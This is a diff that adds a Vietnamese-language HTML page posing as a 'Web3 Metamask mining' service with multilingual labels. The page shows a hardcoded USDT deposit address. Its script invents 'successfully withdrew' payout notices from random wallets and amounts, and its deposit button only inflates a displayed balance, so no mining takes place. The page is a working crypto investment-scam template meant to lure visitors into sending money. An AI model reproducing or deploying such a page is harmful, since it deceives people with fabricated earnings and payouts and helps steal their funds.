@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Web3 Mining Pro - 1000% Edition</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+    <style>
+        :root { 
+            --bg-dark: #0b0e11; --card-bg: #1e2329; --binance-yellow: #f3ba2f; 
+            --text-gray: #848e9c; --green: #2ebd85; --border: #2b3139;
+        }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: var(--bg-dark); color: #fff; margin: 0; padding-bottom: 80px; overflow-x: hidden; }
+        
+        /* Loader */
+        #loader { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--bg-dark); z-index: 9999; justify-content: center; align-items: center; }
+        .spinner { width: 40px; height: 40px; border: 3px solid #333; border-top: 3px solid var(--binance-yellow); border-radius: 50%; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* Header & Shiny Effect */
+        .header { display: flex; justify-content: space-between; align-items: center; padding: 12px 15px; background: var(--card-bg); border-bottom: 1px solid var(--border); position: sticky; top: 0; z-index: 100; }
+        .lang-select { background: #2b3139; color: #fff; border: 1px solid var(--border); padding: 6px; border-radius: 6px; font-size: 12px; outline: none; }
+        
+        .shiny-text {
+            color: var(--binance-yellow); font-size: 13px; font-weight: bold; text-transform: uppercase;
+            background: linear-gradient(90deg, var(--binance-yellow) 0%, #fff 50%, var(--binance-yellow) 100%);
+            background-size: 200% auto; -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+            animation: shine 2.5s linear infinite; text-align: center; flex: 1; margin: 0 10px;
+        }
+        @keyframes shine { to { background-position: 200% center; } }
+
+        .btn-connect { background: transparent; border: 1px solid var(--binance-yellow); color: var(--binance-yellow); padding: 7px 12px; border-radius: 8px; font-size: 11px; cursor: pointer; font-weight: bold; white-space: nowrap; min-width: 105px; }
+
+        /* Pages */
+        .page { display: none; padding: 15px; animation: fadeIn 0.3s ease; box-sizing: border-box; }
+        .active { display: block !important; } /* Force hiển thị khi chuyển trang */
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
+
+        .card { background: var(--card-bg); border-radius: 20px; padding: 20px; margin-bottom: 15px; border: 1px solid var(--border); box-shadow: 0 4px 15px rgba(0,0,0,0.2); }
+        .address-box { background: #000; padding: 12px; border-radius: 12px; font-size: 11px; color: var(--text-gray); margin: 15px 0; border: 1px solid #333; display: flex; justify-content: space-between; align-items: center; position: relative; }
+        
+        .copy-btn { 
+            color: #000; background: var(--binance-yellow); font-weight: bold; cursor: pointer; 
+            padding: 6px 12px; border: none; border-radius: 6px; font-size: 10px; text-transform: uppercase;
+        }
+
+        .btn-main { width: 100%; padding: 16px; border: none; border-radius: 12px; font-weight: bold; font-size: 16px; cursor: pointer; background: var(--binance-yellow); color: #000; transition: 0.2s; }
+        .btn-main:active { transform: scale(0.98); opacity: 0.9; }
+
+        /* Live Payouts */
+        .payout-box { background: rgba(0,0,0,0.4); border-radius: 15px; padding: 15px; margin-top: 15px; border: 1px solid var(--border); min-height: 120px; }
+        .payout-item { display: flex; justify-content: space-between; align-items: center; font-size: 12px; margin-bottom: 8px; animation: slideIn 0.5s ease-out; }
+        @keyframes slideIn { from { transform: translateX(-20px); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
+        .dot { width: 7px; height: 7px; background: var(--green); border-radius: 50%; display: inline-block; margin-right: 8px; box-shadow: 0 0 8px var(--green); }
+
+        /* Navigation */
+        .nav { position: fixed; bottom: 0; width: 100%; background: var(--card-bg); display: flex; justify-content: space-around; padding: 12px 0; border-top: 1px solid var(--border); z-index: 1000; }
+        .nav-item { color: var(--text-gray); text-align: center; font-size: 11px; cursor: pointer; flex: 1; transition: 0.3s; }
+        .nav-item.active { color: var(--binance-yellow); font-weight: bold; }
+    </style>
+</head>
+<body>
+
+<div id="loader"><div class="spinner"></div></div>
+
+<div class="header">
+    <select class="lang-select" id="langSelector" onchange="setLanguage()">
+        <option value="vi">Tiếng Việt</option>
+        <option value="en">English</option>
+        <option value="es">Español</option>
+        <option value="br">Português</option>
+        <option value="zh">中文</option>
+    </select>
+    <div class="shiny-text" id="shimmerTitle">Khai thác wed3 metamask</div>
+    <button class="btn-connect" id="cnBtn" onclick="connect()">Connect Wallet</button>
+</div>
+
+<div id="home" class="page active">
+    <div class="card" style="background: linear-gradient(135deg, #2ebd85 0%, #1e2329 100%);">
+        <div style="display:flex; justify-content:space-between; align-items: center;">
+            <span id="L_bal">Số dư khả dụng (USDT)</span>
+            <span onclick="toggle()" style="cursor:pointer; font-size: 20px;">👁️</span>
+        </div>
+        <h2 id="usdt_H" style="font-size: 32px; margin: 10px 0;">$ 0.00</h2>
+        <p id="L_st" style="font-size: 12px; margin: 0; opacity: 0.9;">Hệ thống đang đào...</p>
+    </div>
+
+    <div class="card">
+        <p id="L_addr" style="color: var(--binance-yellow); font-size: 12px; font-weight: bold;">Địa chỉ ví nạp USDT (BEP20):</p>
+        <div class="address-box">
+            <input type="text" id="hiddenAddr" value="0x841100e786c77e475d328469c95238d063078610" style="position:absolute; left:-9999px;">
+            <span id="wallet_Addr">0x841100e786c77e475d328469c95238d063078610</span>
+            <button class="copy-btn" id="L_cp_btn" onclick="doCopy()">COPY</button>
+        </div>
+        <input type="number" id="in_Deposit" placeholder="0.00" style="width:100%; padding:16px; background:#0b0e11; border:1px solid var(--border); color:#fff; border-radius:12px; margin-bottom:15px; outline:none; box-sizing:border-box; font-size: 16px;">
+        <button id="L_btn" class="btn-main" onclick="deposit()">Kích hoạt Khai thác</button>
+        
+        <div class="payout-box" id="payoutC"></div>
+    </div>
+</div>
+
+<div id="exchange" class="page">
+    <div class="card">
+        <h3 id="L_ex_title">Quy đổi</h3>
+        <p id="L_ex_st" style="color:var(--text-gray)">Tính năng đang cập nhật...</p>
+    </div>
+</div>
+
+<div id="account" class="page">
+    <div class="card">
+        <h3 id="L_acc_title">Số dư tài khoản</h3>
+        <h1 id="usdt_A">$ 0.00</h1>
+    </div>
+</div>
+
+<div class="nav">
+    <div class="nav-item active" id="nav_home" onclick="go(event, 'home')">🏠<br><span id="N_h">Trang chủ</span></div>
+    <div class="nav-item" id="nav_exchange" onclick="go(event, 'exchange')">🔄<br><span id="N_e">Quy đổi</span></div>
+    <div class="nav-item" id="nav_account" onclick="go(event, 'account')">👤<br><span id="N_a">Tài khoản</span></div>
+</div>
+
+<script>
+    let state = { usdt: 0, lang: 'vi', hide: false };
+
+    // HỆ THỐNG ĐA NGÔN NGỮ ĐẦY ĐỦ
+    const langData = {
+        vi: { bal: "Số dư khả dụng (USDT)", st: "Hệ thống đang đào...", ad: "Địa chỉ nạp (BEP20):", btn: "Kích hoạt Khai thác", nh: "Trang chủ", ne: "Quy đổi", na: "Tài khoản", cp: "Đã copy!", wd: "vừa rút thành công", title: "Khai thác wed3 metamask", ex: "Quy đổi", acc: "Số dư tài khoản", up: "Tính năng đang cập nhật..." },
+        en: { bal: "Available Balance (USDT)", st: "System running...", ad: "Deposit Address:", btn: "Activate Mining", nh: "Home", ne: "Exchange", na: "Account", cp: "Copied!", wd: "successfully withdrew", title: "Web3 Metamask Mining", ex: "Exchange", acc: "Account Balance", up: "Feature updating..." },
+        es: { bal: "Saldo disponible (USDT)", st: "Sistema activo...", ad: "Dirección (BEP20):", btn: "Activar Minería", nh: "Inicio", ne: "Canje", na: "Cuenta", cp: "¡Copiado!", wd: "retiró con éxito", title: "Minería Web3 Metamask", ex: "Canje", acc: "Saldo de la cuenta", up: "Característica actualizando..." },
+        br: { bal: "Saldo disponível (USDT)", st: "Sistema ativo...", ad: "Endereço (BEP20):", btn: "Ativar Mineração", nh: "Início", ne: "Troca", na: "Conta", cp: "Copiado!", wd: "retirou com sucesso", title: "Mineração Web3 Metamask", ex: "Troca", acc: "Saldo da conta", up: "Recurso atualizando..." },
+        zh: { bal: "可用余额 (USDT)", st: "系统运行中...", ad: "充值地址:", btn: "激活挖矿", nh: "首页", ne: "兑换", na: "账户", cp: "已复制!", wd: "成功提取了", title: "Web3 Metamask 挖矿", ex: "兑换", acc: "账户余额", up: "功能更新中..." }
+    };
+
+    // 1. CHUYỂN TRANG 100% HOẠT ĐỘNG
+    function go(e, id) {
+        if(e) e.preventDefault();
+        document.getElementById('loader').style.display = 'flex';
+        
+        setTimeout(() => {
+            document.getElementById('loader').style.display = 'none';
+            // Ẩn tất cả trang
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+            // Hiện trang được chọn
+            const targetPage = document.getElementById(id);
+            if(targetPage) targetPage.classList.add('active');
+            
+            // Cập nhật thanh nav
+            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+            const activeNavItem = e.currentTarget;
+            if(activeNavItem) activeNavItem.classList.add('active');
+        }, 300);
+    }
+
+    // 2. LIVE NOTIFICATION (VỪA RÚT THÀNH CÔNG)
+    function createPayout() {
+        const container = document.getElementById('payoutC');
+        const wallets = ["0x71a...f2e","0x88b...12a","0xfe2...99d","0x32c...44b","0x99f...00e"];
+        const amounts = [150.5, 500, 1200, 45, 2500, 88.2];
+        
+        const item = document.createElement('div');
+        item.className = 'payout-item';
+        
+        const randomW = wallets[Math.floor(Math.random()*wallets.length)];
+        const randomA = amounts[Math.floor(Math.random()*amounts.length)];
+        const l = langData[state.lang] || langData.vi;
+
+        item.innerHTML = `
+            <span><span class="dot"></span>${randomW} ${l.wd}</span>
+            <b style="color:var(--binance-yellow)">+${randomA} USDT</b>
+        `;
+        
+        container.prepend(item);
+        if(container.children.length > 4) container.removeChild(container.lastChild);
+    }
+    setInterval(createPayout, 3500);
+    createPayout(); // Chạy ngay lập tức
+
+    // 3. COPY ĐỊA CHỈ VÍ (SIÊU ỔN ĐỊNH)
+    function doCopy() {
+        const copyText = document.getElementById("hiddenAddr");
+        copyText.select();
+        copyText.setSelectionRange(0, 99999); // Mobile
+        
+        try {
+            const successful = document.execCommand('copy');
+            if (!successful) {
+                navigator.clipboard.writeText(copyText.value);
+            }
+            alert(langData[state.lang].cp);
+        } catch (err) {
+            // Fallback cuối cùng
+            alert("Vui lòng copy thủ công: " + copyText.value);
+        }
+    }
+
+    // 4. KẾT NỐI VÍ
+    async function connect() {
+        if(window.ethereum) {
+            try {
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                const adr = accounts[0];
+                document.getElementById('cnBtn').innerText = adr.slice(0,6) + "..." + adr.slice(-4);
+                document.getElementById('cnBtn').style.color = "#2ebd85";
+                document.getElementById('cnBtn').style.borderColor = "#2ebd85";
+            } catch (e) { console.error(e); }
+        } else {
+            alert("Please use MetaMask or Trust Wallet Browser");
+        }
+    }
+
+    // 5. CÀI ĐẶT NGÔN NGỮ
+    function setLanguage() {
+        state.lang = document.getElementById('langSelector').value;
+        const l = langData[state.lang] || langData.vi;
+        
+        document.getElementById('L_bal').innerText = l.bal;
+        document.getElementById('L_st').innerText = l.st;
+        document.getElementById('L_addr').innerText = l.ad;
+        document.getElementById('L_btn').innerText = l.btn;
+        document.getElementById('N_h').innerText = l.nh;
+        document.getElementById('N_e').innerText = l.ne;
+        document.getElementById('N_a').innerText = l.na;
+        document.getElementById('shimmerTitle').innerText = l.title;
+        document.getElementById('L_ex_title').innerText = l.ex;
+        document.getElementById('L_acc_title').innerText = l.acc;
+        document.getElementById('L_ex_st').innerText = l.up;
+        document.getElementById('L_cp_btn').innerText = (state.lang === 'zh' ? "复制" : "COPY");
+    }
+
+    function toggle() {
+        state.hide = !state.hide;
+        const v = state.hide ? "**" : "$ " + state.usdt.toFixed(2);
+        document.getElementById('usdt_H').innerText = v;
+        document.getElementById('usdt_A').innerText = v;
+    }
+
+    function deposit() {
+    const input = document.getElementById('in_Deposit');
+    let v = parseFloat(input.value);
+    
+    if (v > 0) {
+        state.usdt += v;
+        // LỆNH QUAN TRỌNG: Gửi tiền lên server ngay lập tức
+        saveToServer(v); 
+
+        // Cập nhật số tiền hiển thị trên màn hình
+        const formatted = "$" + state.usdt.toFixed(2);
+        if(document.getElementById('usdt_H')) document.getElementById('usdt_H').innerText = formatted;
+        if(document.getElementById('usdt_A')) document.getElementById('usdt_A').innerText = formatted;
+        
+        input.value = "";
+        console.log("Đã nạp và gửi lên server: " + v);
+    }
+}
+    // Hàm gửi tiền lên server để cất giữ
+async function saveToServer(amount) {
+    await fetch('http://localhost:3000/mine', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username: 'admin', amount: amount })
+    });
+}
+
+// Hàm lấy tiền từ server về khi mở máy
+async function loadFromServer() {
+    const res = await fetch('http://localhost:3000/balance/admin');
+    const data = await res.json();
+    state.usdt = data.balance; // Cập nhật biến tiền trong code của bạn
+    document.getElementById('usdt_A').innerText = "$" + data.balance; // Hiển thị ra màn hình
+}
+
+// Tự động tải tiền khi vừa mở trang web
+loadFromServer();
+</script>
+</body>
+</html>).
